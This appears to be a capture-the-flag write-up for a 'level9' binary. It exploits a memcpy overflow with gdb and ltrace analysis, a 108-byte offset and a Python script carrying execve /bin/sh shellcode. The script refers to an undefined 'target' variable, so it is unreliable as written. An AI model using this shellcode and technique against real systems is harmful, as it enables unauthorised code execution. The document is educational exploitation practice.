This binary doesnt seems to do much.
But we can make it segfault on a memcpy:
```
ltrace ./level9 $(python -c 'print "A"*150')
```

We also notice a call to *edx at 0x08048693
The line 
`=> 0x08048682 <+142>:	mov    (%eax),%edx`
show use that the value pointed to by eax will be stored in edx.
After the segfault, gdb will show us that eax contain a part of our string:
```
(gdb) info reg eax
eax            0x41414141	1094795585
```

To see the exact offset, we can use the pattern tool from metasploit, and we get an offset of 108.
eax will get derefferenced twice and put in edx, that will get loaded into eip by `call`
Since we controle eax, we have to make it point to a place holding the address of our shellcode.
We can see the address of the memcpy, which will be the begining of our input,
so we build our shellcode as follow :

`[ptr to shellcode] + [shellcode] + padding + [ptr to "ptr to shellcode"]`

Aka:
```
offset = 108
shellcode = '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80'
targetA = "\x0c\xa0\x04\x08"
targetB = "\x10\xa0\x04\x08"
print targetB + shellcode + "A" * (offset - len(shellcode) - len(target)) + targetA
```

And simply:
`./level9 $(python /tmp/shellcode.py)`

(I reused the shellcode from lvl2 because looking at the over levels I think I overkilled level2)
